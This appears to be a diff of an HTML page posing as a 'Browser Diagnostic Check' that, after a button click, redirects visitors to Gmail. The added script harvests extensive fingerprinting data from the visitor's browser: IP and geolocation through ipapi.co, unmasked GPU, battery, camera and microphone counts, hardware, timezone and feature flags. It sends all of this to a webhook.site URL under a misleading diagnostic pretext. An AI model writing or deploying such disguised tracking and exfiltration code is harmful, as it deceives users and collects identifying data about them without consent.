@@ -3,213 +3,255 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <title>Browser Diagnostic Redirect</title>
-
 <style>
-body{
-    margin:0;
-    min-height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    background:#202124;
-    font-family:Arial,sans-serif;
+* {
+    box-sizing: border-box;
 }
-
-.card{
-    width:90%;
-    max-width:420px;
-    background:#fff;
-    padding:35px;
-    border-radius:18px;
-    text-align:center;
-    box-shadow:0 10px 30px rgba(0,0,0,.35);
+body {
+    margin: 0;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: #202124;
+    font-family: Arial, sans-serif;
 }
-
-button{
-    width:100%;
-    padding:15px;
-    border:0;
-    border-radius:10px;
-    background:#0066ff;
-    color:white;
-    font-size:17px;
-    cursor:pointer;
+.card {
+    width: 90%;
+    max-width: 450px;
+    background: white;
+    padding: 35px;
+    border-radius: 18px;
+    text-align: center;
+    box-shadow: 0 10px 30px rgba(0,0,0,.35);
 }
-
-button:disabled{
-    background:#888;
+button {
+    width: 100%;
+    padding: 15px;
+    margin-top: 20px;
+    border: 0;
+    border-radius: 10px;
+    background: #0066ff;
+    color: white;
+    font-size: 17px;
+    cursor: pointer;
+    transition: background 0.2s;
 }
-
-#status{
-    margin-top:20px;
-    font-size:14px;
+button:hover {
+    background: #0052cc;
+}
+button:disabled {
+    background: #888;
+    cursor: not-allowed;
+}
+#status {
+    margin-top: 20px;
+    font-size: 14px;
+    color: #555;
 }
 </style>
-
 </head>
-
 <body>
 
 <div class="card">
-
-<h2>Continue</h2>
-
-<p>Browser Diagnostic</p>
-
-<button id="send">
-Kirim & Buka Mail
-</button>
-
-<div id="status">
-Siap
+    <h2>Continue</h2>
+    <p>Browser Diagnostic Check</p>
+    <button id="send">Kirim & Buka Gmail</button>
+    <div id="status">Ready</div>
 </div>
-
-</div>
-
 
 <script>
+const WEBHOOK = "https://webhook.site/cf75fcc7-0cfa-4508-a0cb-f13a2fa22deb";
 
-const WEBHOOK =
-"https://webhook.site/cf75fcc7-0cfa-4508-a0cb-f13a2fa22deb";
+const safe = (val) => val ?? null;
 
-
-function collectData(){
-
-const n = navigator;
-
-const conn =
-n.connection ||
-n.webkitConnection ||
-n.mozConnection;
-
-
-return {
-
-event:"browser_diagnostic",
-
-timestamp:new Date().toISOString(),
-
-page:{
-    url:location.href,
-    title:document.title,
-    referrer:document.referrer || ""
-},
-
-browser:{
-    userAgent:n.userAgent,
-    language:n.language,
-    languages:n.languages,
-    platform:n.platform,
-    vendor:n.vendor,
-    online:n.onLine,
-    cookieEnabled:n.cookieEnabled
-},
-
-screen:{
-    width:screen.width,
-    height:screen.height,
-    availableWidth:screen.availWidth,
-    availableHeight:screen.availHeight,
-    colorDepth:screen.colorDepth,
-    pixelRatio:window.devicePixelRatio
-},
-
-window:{
-    width:innerWidth,
-    height:innerHeight
-},
-
-device:{
-    cpu:n.hardwareConcurrency || null,
-    memory:n.deviceMemory || null,
-    touch:n.maxTouchPoints > 0,
-    touchPoints:n.maxTouchPoints || 0
-},
-
-network:conn ? {
-    type:conn.effectiveType || null,
-    downlink:conn.downlink || null,
-    rtt:conn.rtt || null
-}:null,
-
-time:{
-    timezone:Intl.DateTimeFormat()
-    .resolvedOptions()
-    .timeZone,
-
-    local:new Date().toString()
+// 1. Pengambilan Data IP & Geolocation Network
+async function getIPInfo() {
+    try {
+        const res = await fetch("https://ipapi.co/json/", { cache: "no-store" });
+        if (!res.ok) return null;
+        const data = await res.json();
+        return {
+            ip: data.ip,
+            city: data.city,
+            region: data.region,
+            country: data.country_name,
+            asn: data.asn,
+            org: data.org
+        };
+    } catch (e) {
+        return null;
+    }
 }
 
+// 2. Status Baterai
+async function getBattery() {
+    try {
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            return {
+                level: Math.round(b.level * 100) + "%",
+                charging: b.charging,
+                chargingTime: b.chargingTime,
+                dischargingTime: b.dischargingTime
+            };
+        }
+    } catch (e) {}
+    return null;
+}
+
+// 3. Deteksi Perangkat Kartu Grafis (WebGL Unmasked GPU)
+function getGPUInfo() {
+    try {
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        if (!gl) return null;
+        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+        return {
+            vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+            renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
+        };
+    } catch (e) {
+        return null;
+    }
+}
+
+// 4. Deteksi Perangkat Media Input (Kamera & Mikrofon)
+async function getMediaDevices() {
+    try {
+        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            return {
+                audioInputCount: devices.filter(d => d.kind === 'audioinput').length,
+                videoInputCount: devices.filter(d => d.kind === 'videoinput').length,
+                audioOutputCount: devices.filter(d => d.kind === 'audiooutput').length
+            };
+        }
+    } catch (e) {}
+    return null;
+}
+
+// 5. Fungsi Utama Pengumpulan Data
+function collectBaseData() {
+    const n = navigator;
+    const connection = n.connection || n.webkitConnection || n.mozConnection;
+
+    return {
+        event: "browser_diagnostic_full_get",
+        timestamp: new Date().toISOString(),
+        page: {
+            url: location.href,
+            title: document.title,
+            referrer: document.referrer || "Direct",
+            visibility: document.visibilityState
+        },
+        browser: {
+            userAgent: n.userAgent,
+            language: n.language,
+            languages: n.languages ? n.languages.join(",") : n.language,
+            platform: n.platform,
+            vendor: n.vendor,
+            online: n.onLine,
+            cookieEnabled: n.cookieEnabled,
+            doNotTrack: safe(n.doNotTrack),
+            pdfViewer: safe(n.pdfViewerEnabled)
+        },
+        screen: {
+            width: screen.width,
+            height: screen.height,
+            availableWidth: screen.availWidth,
+            availableHeight: screen.availHeight,
+            colorDepth: screen.colorDepth,
+            pixelRatio: window.devicePixelRatio,
+            orientation: screen.orientation ? screen.orientation.type : null
+        },
+        window: {
+            innerWidth: window.innerWidth,
+            innerHeight: window.innerHeight,
+            outerWidth: window.outerWidth,
+            outerHeight: window.outerHeight
+        },
+        hardware: {
+            cpuThreads: safe(n.hardwareConcurrency),
+            deviceMemoryGB: safe(n.deviceMemory),
+            maxTouchPoints: safe(n.maxTouchPoints),
+            isTouchDevice: n.maxTouchPoints > 0
+        },
+        network: connection ? {
+            effectiveType: safe(connection.effectiveType),
+            downlink: safe(connection.downlink),
+            rtt: safe(connection.rtt),
+            saveData: safe(connection.saveData)
+        } : null,
+        timezone: {
+            zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            offsetMinutes: new Date().getTimezoneOffset(),
+            localTime: new Date().toString()
+        },
+        storage: {
+            localStorage: !!window.localStorage,
+            sessionStorage: !!window.sessionStorage,
+            indexedDB: !!window.indexedDB,
+            serviceWorker: 'serviceWorker' in n
+        },
+        features: {
+            bluetooth: !!n.bluetooth,
+            usb: !!n.usb,
+            clipboard: !!n.clipboard,
+            geolocation: !!n.geolocation,
+            webGL: !!window.WebGLRenderingContext
+        }
+    };
+}
+
+// Execution Trigger
+document.getElementById("send").onclick = async function() {
+    this.disabled = true;
+    const status = document.getElementById("status");
+    status.innerHTML = "Memproses diagnostik sistem...";
+
+    // Mengumpulkan data secara sinkron dan asinkron
+    let payload = collectBaseData();
+    
+    // Promise Parallelization untuk mempercepat eksekusi
+    const [ipInfo, batteryInfo, mediaDevicesInfo] = await Promise.all([
+        getIPInfo(),
+        getBattery(),
+        getMediaDevices()
+    ]);
+
+    payload.ipNetwork = ipInfo;
+    payload.battery = batteryInfo;
+    payload.gpu = getGPUInfo();
+    payload.mediaHardware = mediaDevicesInfo;
+
+    status.innerHTML = "Mengirim data...";
+
+    // Menyusun Query String secara aman
+    const query = new URLSearchParams();
+    
+    Object.entries(payload).forEach(([key, value]) => {
+        query.append(
+            key,
+            typeof value === "object" ? JSON.stringify(value) : value
+        );
+    });
+
+    try {
+        await fetch(WEBHOOK + "?" + query.toString(), {
+            method: "GET",
+            mode: "no-cors"
+        });
+        status.innerHTML = "Selesai. Mengalihkan...";
+    } catch (e) {
+        status.innerHTML = "Mengalihkan...";
+    }
+
+    setTimeout(() => {
+        window.location.href = "https://mail.google.com/mail/u/0/#inbox";
+    }, 800);
 };
-
-}
-
-
-
-document.getElementById("send")
-.onclick = async function(){
-
-this.disabled=true;
-
-const status =
-document.getElementById("status");
-
-status.innerHTML="Mengirim...";
-
-
-const data = collectData();
-
-
-const params = new URLSearchParams();
-
-
-Object.keys(data).forEach(key=>{
-
-params.append(
-key,
-typeof data[key] === "object"
-? JSON.stringify(data[key])
-: data[key]
-);
-
-});
-
-
-try{
-
-await fetch(
-WEBHOOK+"?"+params.toString(),
-{
-method:"GET",
-mode:"no-cors"
-}
-);
-
-
-status.innerHTML=
-"Berhasil. Membuka mail.com...";
-
-
-}catch(e){
-
-status.innerHTML=
-"Redirect...";
-
-}
-
-
-setTimeout(()=>{
-
-window.location.href=
-"https://mail.google.com/mail/u/0/#inbox";
-
-},1000);
-
-
-};
-
 </script>
 
 </body>
